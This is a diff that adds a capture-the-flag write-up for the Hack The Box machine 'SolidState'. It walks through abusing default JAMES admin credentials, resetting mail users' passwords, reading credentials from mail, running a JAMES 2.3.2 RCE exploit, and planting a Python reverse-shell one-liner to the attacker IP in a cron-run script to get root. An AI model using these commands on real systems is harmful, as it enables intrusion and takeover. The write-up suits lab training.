@@ -49,7 +49,8 @@ Nmap done: 1 IP address (1 host up) scanned in 599.38 seconds
 The machine is running SSH, a HTTP server on port 80, and there are some other ports open - 25, 110, 119 and 4555.
 
 ### 2. Enumeration
-Firstly check out and get the version for smtp/pop3 as nmap wasn't able to do it.
+Check out the website first. It is a HTML template called "Solid State" with a couple of pages, and also a "contact" form. I check for SQL injection, try sending some links and inspecting requests in the proxy, and don't find anything. I also dirbust the site every which way and don't find anything.  
+Next, check out and get the version for smtp/pop3 as nmap wasn't able to do it.
 ```bash
 msf5 auxiliary(scanner/smtp/smtp_version) > run
 
@@ -63,7 +64,7 @@ msf5 auxiliary(scanner/pop3/pop3_version) > run
 [*] 10.129.29.189:110     - Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 ```
-These ports are running services from JAMES SMTP Server 2.3.2. The remote administration panel is on port 4555, so I can attempt to log in over telnet.
+These ports are running services from JAMES 2.3.2. The remote administration panel is on port 4555, so I can attempt to log in  with default credentials over telnet.
 ```bash
 ─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-cidvmbkzfc]─[~]
 └──╼ [★]$ telnet 10.129.29.189 4555
@@ -106,6 +107,202 @@ user: john
 user: mindy
 user: mailadmin
 ```
+I can reset passwords as well which is cool.  
+```bash
+Welcome root. HELP for a list of commands
+setpassword thomas password
+Password for thomas reset
+setpassword james password
+Password for james reset
+setpassword mindy password
+Password for mindy reset
+setpassword john password
+Password for john reset
+setpassword mailadmin password
+Password for mailadmin reset
+```
+I then login over POP3 in telnet and see if any users have e-mail. Mindy has some messages:
+```bash
+┌──(kali㉿kali)-[~/Desktop]
+└─$ telnet 10.129.29.189 110                                                                                                                                                                   1 ⨯
+Trying 10.129.29.189...
+Connected to 10.129.29.189.
+Escape character is '^]'.
+USER mindy
++OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
++OK
+PASS password
++OK Welcome mindy
+LIST
++OK 2 1945
+1 1109
+2 836
+.
+RETR 1
++OK Message follows
+Return-Path: <mailadmin@localhost>
+Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
+MIME-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Content-Transfer-Encoding: 7bit
+Delivered-To: mindy@localhost
+Received: from 192.168.11.142 ([192.168.11.142])
+          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
+          for <mindy@localhost>;
+          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
+Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
+From: mailadmin@localhost
+Subject: Welcome
+
+Dear Mindy,
+Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.
+
+We are looking forward to you joining our team and your success at Solid State Security. 
+
+Respectfully,
+James
+.
+RETR 2
++OK Message follows
+Return-Path: <mailadmin@localhost>
+Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
+MIME-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Content-Transfer-Encoding: 7bit
+Delivered-To: mindy@localhost
+Received: from 192.168.11.142 ([192.168.11.142])
+          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
+          for <mindy@localhost>;
+          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
+Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
+From: mailadmin@localhost
+Subject: Your Access
+
+Dear Mindy,
+
+
+Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
+Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 
+
+username: mindy
+pass: P@55W0rd1!2@
+
+Respectfully,
+James
+
+.
+
+```
+This gives me some possible login credentials: `mindy:P@55W0rd1!2@`.
+
+### 3. Get a shell
+Login with the creds:
+```bash
+┌──(kali㉿kali)-[~/Desktop]
+└─$ ssh mindy@10.129.29.189                                                                                                                                                                  130 ⨯
+mindy@10.129.29.189's password: 
+
+Permission denied, please try again.
+mindy@10.129.29.189's password: 
+Permission denied, please try again.
+mindy@10.129.29.189's password: 
+Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
+mindy@solidstate:~$ whoami
+-rbash: whoami: command not found
+```
+This account set up with a restricted shell. Still, from here I can browse some directories and see that there is nothing in the /var/www/html directories aside from the template files.
+  
 The good news from here is that there is an authenticated remote command execution exploit I can leverage to run commands on the machine: https://www.exploit-db.com/exploits/35513. A better explanation can be found at: https://www.rapid7.com/db/modules/exploit/linux/smtp/apache_james_exec/. The key part is this:
   
 *Messages for a given user are stored in a directory partially defined by the username. By creating a user with a directory traversal payload as the username, commands can be written to a given directory.*
+  
+For the payload to tbe triggered, a user needs to login to the machine, which I can do via the "mindy" user. I should be able to use the exploit to create a reverse shell command on the machine that will run when one of the users logs in, hopefully with more freedom. 
+I modify the exploit so that it will execute for any user, and make it a bash reverse shell. Then I run it.
+```bash
+┌──(kali㉿kali)-[~/Desktop/htb/solidstate]
+└─$ python jamesexec.py 10.129.29.189
+[+]Connecting to James Remote Administration Tool...
+[+]Creating user...
+[+]Connecting to James SMTP server...
+[+]Sending payload...
+[+]Done! Payload will be executed once somebody logs in.
+```
+Next, start my listener, then re-attempt a login with mindy. This time I get a bunch of bash_completion errors, but I also get a connection in my listener.
+```bash
+┌──(kali㉿kali)-[~/Desktop]
+└─$ nc -lvnp 9999            
+listening on [any] 9999 ...
+connect to [10.10.14.162] from (UNKNOWN) [10.129.29.189] 50662
+${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ 
+
+${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ whoami
+whoami
+mindy
+```
+This shell appears to be more complete, although it is still /bin/rbash so I can't sudo. I try a bunch of ways to escape out of it, nothing seems to work.
+
+### 3. Enumeration from foothold
+Run linpeas, and see that it discovers a world-writable python script in the /opt directory.
+```bash
+[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                                                                                     
+/dev/mqueue                                                                                                                                                                                        
+/dev/shm
+/home/mindy
+/opt/tmp.py
+/run/lock
+/run/user/1001
+/run/user/1001/gnupg
+/run/user/1001/systemd
+/run/user/1001/systemd/transient
+/tmp
+/tmp/.font-unix
+/tmp/.ICE-unix
+/tmp/.Test-unix
+/tmp/.X11-unix
+/tmp/.XIM-unix
+/var/tmp
+```
+Check it out:
+```bash
+${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ ./linpeas.sh > linpeas_out.txt
+./linpeas.sh > linpeas_out.txt
+ls: cannot access '': No such file or directory
+ls: cannot open directory '/home/james/.gnupg': Permission denied
+ls: cannot open directory '/home/james/.local/share/keyrings': Permission denied
+${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ cat /opt/tmp.py
+cat /opt/tmp.py
+#!/usr/bin/env python
+import os
+import sys
+try:
+     os.system('rm -r /tmp/* ')
+except:
+     sys.exit()
+```
+This script is removing everything in the tmp directory. Interestingly that is the current directory I am working out of. If I try to list files I see that my linpeas script and output file is now gone. Therefore the script must be running regulary at some interval.
+
+### 4. Escalate to root
+Replace this tmp.py file with a reverse shell and then wait.
+```bash
+${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ echo "#!/usr/bin/env python" > /opt/tmp.py && echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.162',9998));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);" >> /opt/tmp.py && echo "Done"
+Done
+```
+Catch the root shell.
+```bash
+┌──(kali㉿kali)-[~/…/htb/solidstate/privilege-escalation-awesome-scripts-suite/linPEAS]
+└─$ nc -lvnp 9998                                        
+listening on [any] 9998 ...
+connect to [10.10.14.162] from (UNKNOWN) [10.129.29.189] 51688
+/bin/sh: 0: can't access tty; job control turned off
+# whoami
+root
+```
